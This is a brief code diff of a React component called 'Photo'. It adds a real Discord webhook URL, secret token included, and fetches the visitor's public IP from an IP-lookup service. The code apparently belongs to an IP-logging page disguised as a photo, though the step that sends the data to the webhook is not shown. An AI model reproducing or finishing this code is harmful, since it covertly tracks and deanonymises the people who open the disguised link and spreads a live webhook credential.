@@ -4,7 +4,7 @@ export default function Photo() {
   const [step, setStep] = useState('loading');
   const [ip, setIp] = useState('unknown');
 
-  const WEBHOOK = 'PASTE_YOUR_WEBHOOK_HERE'; 
+  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y'; 
 
   useEffect(() => {
     fetch('https://api.ipify.org?format=json')
